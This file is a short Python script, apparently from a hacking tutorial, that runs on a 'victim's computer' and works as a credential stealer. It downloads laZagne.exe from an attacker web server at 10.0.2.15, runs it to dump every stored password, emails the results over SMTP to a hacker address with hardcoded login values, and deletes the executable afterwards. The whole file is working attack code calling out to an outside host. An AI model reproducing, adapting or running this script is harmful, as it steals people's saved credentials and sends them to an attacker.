import requests
import subprocess
import smtplib
import os
import tempfile

def download(url):
    get_response = requests.get(url)

    file_name = url.split("/")[-1] # get the last element of the list, which is the file type (.jpg, .pdf etc.)

    # file is created if it does not exist. same directory as program
    # mode is wb because the content that will be written to file is in binary
    myfile = open(file_name, mode='wb')
    myfile.write(get_response.content) # this is in binary format

def send_mail(email, password, message):

    # creates an SMTP server instance. use google's smtp server which runs on port 587
    server = smtplib.SMTP("smtp.live.com", 587)

    server.starttls() # start the server

    server.login(email, password) # log in into email with the given email and pw

    server.sendmail(email, email, message) # send the email to ourself. source email, dest email, message

    server.quit()


# get the directory of the temp file for the victim's computer. this is where laZagne will be downloaded
# works for all platforms
temp_directory = tempfile.gettempdir()

os.chdir(temp_directory) # cd to temp

download("http://10.0.2.15/evil-files/laZagne.exe") # file is hosted on hacker's web server

result = subprocess.check_output("laZagne.exe all", shell=True) # extract the result of the command

send_mail("hacker_email@gmail.com", "asdf1234", result)

os.remove("laZagne.exe")